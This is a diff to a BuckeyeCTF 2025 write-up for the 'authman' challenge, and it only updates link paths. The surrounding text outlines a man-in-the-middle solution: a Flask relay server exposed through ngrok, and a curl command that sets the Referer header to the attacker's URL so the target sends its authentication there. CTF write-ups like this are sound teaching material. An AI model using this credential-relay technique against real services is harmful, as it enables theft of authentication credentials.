@@ -9,7 +9,7 @@ tags: [Medium, MITM, BuckeyeCTF 2025]
 >[https://authman.challs.pwnoh.io](https://authman.challs.pwnoh.io)
 
 
-[!button icon="download" text="authman.zip"](../../files/authman.zip)
+[!button icon="download" text="authman.zip"](../files/web/authman.zip)
 
 ## Solution
 
@@ -44,7 +44,7 @@ So in order to authenticate on `/auth`, we can set up a server that will act as 
 
 To implement this, we can use Flask to create a simple MITM server that will relay the requests between the client and the real server, and host it on a public server (e.g., using ngrok)
 
-1. run the server: [link to code](../files/buckeye2025_authman_solve.py)
+1. run the server: [link to code](../files/web/buckeye2025_authman_solve.py)
 2. Setup ngrok to expose the server to the internet: `ngrok http 8080`
 3. Call `/api/check` with the `Referer` header set to our ngrok URL: 
 `curl -H "Referer: http://<ngrok-url>" https://authman.challs.pwnoh.io/api/check`
